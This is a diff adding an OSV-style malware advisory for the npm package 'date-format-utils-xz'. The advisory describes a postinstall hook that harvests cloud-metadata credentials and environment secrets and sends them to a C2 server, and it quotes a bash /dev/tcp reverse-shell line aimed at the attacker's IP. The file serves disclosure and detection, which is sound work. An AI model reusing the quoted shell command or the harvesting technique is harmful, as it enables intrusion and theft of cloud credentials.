@@ -1,0 +1,53 @@
+{
+  "modified": "2026-07-21T12:00:00Z",
+  "published": "2026-07-21T00:00:00Z",
+  "schema_version": "1.6.0",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "date-format-utils-xz"
+      },
+      "versions": [
+        "1.0.0",
+        "1.0.1",
+        "1.0.2",
+        "1.0.3",
+        "1.0.4"
+      ]
+    }
+  ],
+  "details": "The npm package `date-format-utils-xz` masquerades as a date-formatting utility but is malicious. Its own decoy `index.js` is prefaced with a Chinese comment translating to \"disguised as a normal date formatting tool.\"\n\nEvery published version (1.0.0-1.0.4) declares a `postinstall` lifecycle hook (`postinstall: node postinstall.js`) that runs automatically on `npm install`, before the package is imported, and the payload escalated across releases.\n\nVersions 1.0.0-1.0.3 are a cloud-metadata / environment harvester. The hook shells out with `curl` to the link-local cloud instance-metadata endpoints of the major providers -- Alibaba (100.100.100.200), AWS/GCP-style (169.254.169.254) and Tencent (metadata.tencentyun.com) -- to steal instance identity/roles and (on misconfigured instances) temporary cloud credentials, and runs `env` to dump the full process environment (CI secrets, cloud tokens, npm tokens). The data is exfiltrated by HTTP POST to an attacker-controlled C2 under paths /meta/ali, /meta/aws, /meta/tx, /meta/env (and /meta/all in 1.0.3); 1.0.0 is a lighter recon beacon (GET /pre?h={hostname}&u={user}). The C2 migrated from the domain `zhijiujiu.cn` (1.0.0, 1.0.1) to the hard-coded IP `8.135.48.40` port 80 (1.0.2, 1.0.3) -- a domain-to-IP move that evades DNS-based blocking.\n\nVersion 1.0.4 escalated to a full REVERSE SHELL: postinstall.js opens a TCP connection to 8.135.48.40:4444 via Node net.connect and pipes a spawned /bin/sh over the socket, with fallbacks to `bash -i >& /dev/tcp/8.135.48.40/4444 0>&1` and a python3 pty shell; failures beacon to /shell/failed and /shell/error. This is interactive remote code execution on any host that installs the package.\n\nShortly after publishing 1.0.4 the operator unpublished the entire package from npm (all versions removed from the registry). Detected and classified independently by codelake Research from the live npm feed on 2026-07-21; not present in OSV or GHSA at the time of reporting (a first-catch). Versions 1.0.0-1.0.3 were archived by codelake before the unpublish; 1.0.4 was recovered from a public registry mirror that still cached it.",
+  "credits": [
+    {
+      "name": "codelake Research",
+      "type": "FINDER",
+      "contact": [
+        "https://research.codelake.dev/advisories/clr-2026-3039-date-format-utils-xz"
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://research.codelake.dev/advisories/clr-2026-3039-date-format-utils-xz"
+    }
+  ],
+  "database_specific": {
+    "iocs": {
+      "domains": [
+        "zhijiujiu.cn"
+      ],
+      "ips": [
+        "8.135.48.40"
+      ],
+      "hashes": [
+        "sha256:249f72604801ea2bdf436464ec0b8256f198f33d5d1f1ff8b92d507cd6e30a0c",
+        "sha256:b976e83c3b45962453580fa1c2b7f840f335cbede96832c089b1789bfeeb79c5",
+        "sha256:2adb1a22afb8fac18cf5ce68ebfd2fa1409faea7fef2807f3544cc9e6cd6a4b4",
+        "sha256:5d8278b7fa3ff1866f1361c7042c03ad0257e49d33072ed1698d2dd3864d1ec2",
+        "sha256:e7612d9538dfbd3e64b491f4c9c14387574e3a298a2d34dd453f75ca8f3a4ae2"
+      ]
+    }
+  }
+}
